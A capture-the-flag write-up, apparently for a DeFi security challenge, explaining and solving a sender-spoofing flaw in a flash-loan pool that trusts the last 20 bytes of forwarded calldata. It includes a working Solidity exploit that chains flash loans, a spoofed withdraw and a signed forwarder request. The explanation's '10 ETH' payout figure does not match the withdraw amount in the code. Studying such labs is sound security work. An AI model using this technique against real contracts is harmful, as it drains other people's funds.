# Statement:

<img width="790" height="299" alt="image" src="https://github.com/user-attachments/assets/b4a29a3e-c707-449c-b737-46dfbee862d4" />

### For making things clear:

- Pool with 1000 WETH
- This pool offers flashloan
- 1 WETH fee
- meta-transactions using forwarder
- user has 10 WETH in balance
- We need to extract all the ETH in NaiveReceiverPool and transfer it to a recovery address using the flash loan.

### 3 main things that we will use to transfer all the funds to recover account:

- Multi call
- Forwarding
- Signing

### Vulnerability:

NaiveReceiver `(src/naive-receiver/NaiveReceiver.sol)` has a nasty bug: when a call comes through the `trustedForwarder` the 
contract just grabs the last 20 bytes of `msg.data` and treats that as who sent the call. 
That means if someone can control the forwarded calldata they can pretend to be anyone — so functions like 
`withdraw` that trust `_msgSender()` can be tricked into moving other people’s funds. That is why, we will call `withdraw` function
in `NaiveReceiver`, forward it with `trustedForwarder` with extra `msg.data`.

### Diagram:

<img width="612" height="335" alt="image" src="https://github.com/user-attachments/assets/7de934a0-36f5-4e18-8047-91efad27e2be" />

### Solution Code:

``` solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory calldatas = new bytes[](11);

        for(uint i=0; i<=10; i++){
            calldatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 1e18, ""));
            console.log("c");
        }

        calldatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw , (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), (bytes32(uint256(uint160(deployer)))));

        bytes memory callData = abi.encodeCall(pool.multicall, calldatas);
        BasicForwarder.Request memory req = BasicForwarder.Request(
            player,
            address(pool),
            0,
            10000000,
            forwarder.nonces(address(player)),
            callData,
            2 days
        );

        bytes32 request = keccak256(abi.encodePacked("\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(req))
        );

        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,request);
        bytes memory signature = abi.encodePacked(r, s, v);

        require(forwarder.execute(req,signature));
    }
```

### Code Explained:

We build 11 calls in total. The first 10 call flashLoan() — each one charges a fixed 1 ETH fee and the pool records that fee as a 
deposit for the feeReceiver. The last call is a withdraw() that will take out whatever is stored for that account. We pack all 11 
calls into a single multicall() so they run inside one transaction, and we append the deployer address to the end of the overall 
calldata. Because the pool trusts the trusted forwarder, its _msgSender() helper slices the last 20 bytes of msg.data and treats 
that as the caller — so by appending deployer we make the pool think the withdraw came from the feeReceiver. We wrap that whole 
multicall into a forwarder request, sign it with the player’s key, and ask the forwarder to execute it. The forwarder verifies 
the signature and calls the pool with our crafted calldata; the pool then pays out the 10 ETH (the fees accumulated by the flash 
loans) to our recovery address.




